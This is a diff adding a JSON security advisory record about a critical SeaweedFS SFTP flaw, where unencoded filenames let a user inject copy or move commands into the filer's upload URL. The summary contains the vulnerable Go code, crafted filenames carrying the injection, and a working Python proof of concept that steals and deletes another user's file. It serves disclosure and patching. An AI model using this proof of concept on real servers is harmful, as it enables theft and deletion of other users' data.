@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-vwwx-w898-9f4r",
+  "aliases": [],
+  "title": "SFTP chroot escape via unescaped filename in upload URL allows cross-user data disclosure and deletion",
+  "summary": "### Summary\r\nThe SFTP server confines each user to their home directory, but when uploading a file it builds the destination URL by concatenating the user-controlled filename into the HTTP request path **without URL-encoding it**. A filename containing `?` is interpreted by the filer's raw HTTP API as a query string, allowing an authenticated SFTP user to inject `cp.from` / `mv.from` and read, move, or delete **any other user's files**.\r\n\r\n### Details\r\nIn `weed/sftpd/sftp_filer.go`, `putFile` concatenates the filename directly into the URL:\r\n\r\n```go\r\nuploadUrl := fmt.Sprintf(\"http://%s%s\", fs.filerAddr, filepath)\r\nreq, err := http.NewRequest(http.MethodPut, uploadUrl, body)\r\n```\r\n\r\nThe chroot check in `toAbsolutePath` (`weed/sftpd/sftp_server.go`) only resolves `.` / `..` segments with `path.Join` and verifies the result stays under `HomeDir`. It does not reject `?`, so a filename such as:\r\n\r\n```\r\nsteal?cp.from=/home/bob/secret.txt\r\n```\r\n\r\npasses the chroot check, then becomes the URL:\r\n\r\n```\r\nhttp://filer:8888/home/alice/steal?cp.from=/home/bob/secret.txt\r\n```\r\n\r\nwhich the HTTP client parses as `URL.Path = /home/alice/steal` and `URL.RawQuery = cp.from=/home/bob/secret.txt`.\r\n\r\nThe filer write handler (`weed/server/filer_server_handlers_write.go`) treats those query parameters as server-side copy/move commands executed with full filer privileges:\r\n\r\n```go\r\nif query.Has(\"mv.from\") {\r\n    fs.move(ctx, w, r, so)\r\n} else if query.Has(\"cp.from\") {\r\n    fs.copy(ctx, w, r, so)\r\n} else {\r\n    fs.autoChunk(...)\r\n}\r\n```\r\n\r\nThe SFTP-server-minted JWT (`security.GenJwtForFilerServer`) has no `AllowedPrefixes`, so the filer's path-scope check does not constrain the injected source path.\r\n\r\n### PoC\r\nDeployment: `weed master` + `weed volume` + `weed filer` + `weed sftp`, with two users in different home directories:\r\n\r\n```json\r\n[\r\n  { \"Username\": \"alice\", \"Password\": \"alicepass\", \"HomeDir\": \"/home/alice\", \"Uid\": 1001, \"Gid\": 1001, \"Permissions\": { \"/home/alice\": [\"*\"] } },\r\n  { \"Username\": \"bob\",   \"Password\": \"bobpass\",   \"HomeDir\": \"/home/bob\",   \"Uid\": 1002, \"Gid\": 1002, \"Permissions\": { \"/home/bob\":   [\"*\"] } }\r\n]\r\n```\r\n\r\n1. Bob uploads a secret: `put /secret.txt` → stored at `/home/bob/secret.txt`.\r\n2. As Alice, a direct read of any path outside `/home/alice` is denied (chroot intact).\r\n3. Alice uploads `put /steal?cp.from=/home/bob/secret.txt`.\r\n4. Alice downloads `/steal` and receives Bob's content.\r\n\r\nThe `mv.from` variant deletes the victim's file and delivers its content to the attacker:\r\n\r\n```python\r\nimport paramiko\r\n\r\nHOST, PORT = \"127.0.0.1\", 2022\r\n\r\ndef put(user, pw, remote, data):\r\n    t = paramiko.Transport((HOST, PORT)); t.connect(username=user, password=pw)\r\n    s = paramiko.SFTPClient.from_transport(t)\r\n    with s.open(remote, \"wb\") as f: f.write(data)\r\n    s.close(); t.close()\r\n\r\ndef get(user, pw, remote):\r\n    t = paramiko.Transport((HOST, PORT)); t.connect(username=user, password=pw)\r\n    s = paramiko.SFTPClient.from_transport(t)\r\n    try:\r\n        with s.open(remote, \"rb\") as f: return f.read()\r\n    except IOError: return None\r\n    finally: s.close(); t.close()\r\n\r\nput(\"bob\", \"bobpass\", \"/secret.txt\", b\"BOB-SUPER-SECRET\\n\")\r\nassert get(\"alice\", \"alicepass\", \"/secret.txt\") is None          # chroot blocks direct read\r\n\r\nput(\"alice\", \"alicepass\", \"/steal?cp.from=/home/bob/secret.txt\", b\"dummy\")\r\nprint(get(\"alice\", \"alicepass\", \"/steal\"))   # b'BOB-SUPER-SECRET\\n'\r\n\r\nput(\"alice\", \"alicepass\", \"/stolen?mv.from=/home/bob/secret.txt\", b\"dummy\")\r\nprint(get(\"bob\", \"bobpass\", \"/secret.txt\"))  # None  (deleted)\r\nprint(get(\"alice\", \"alicepass\", \"/stolen\"))  # b'BOB-SUPER-SECRET\\n'\r\n```\r\n\r\n<img width=\"1288\" height=\"841\" alt=\"image\" src=\"https://github.com/user-attachments/assets/22326c66-076a-43be-9a33-9fc930497e01\" />\r\n\r\n\r\n### Impact\r\nAn authenticated SFTP user escapes their home directory and can read (`cp.from`) or move/delete (`mv.from`) any other user's data, crossing the per-user isolation boundary the SFTP server is desi...",
+  "published_at": "2026-09-12T16:08:32.000Z",
+  "modified_at": "2026-09-12T16:08:32.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.9,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-74"
+  ],
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "4.42"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-vwwx-w898-9f4r",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-vwwx-w898-9f4r",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-vwwx-w898-9f4r",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:6a2e607e6b3fc94558d13703ac7c7918bf2b2741d4b4c28eb61bd0410904f93f",
+  "note": null
+}
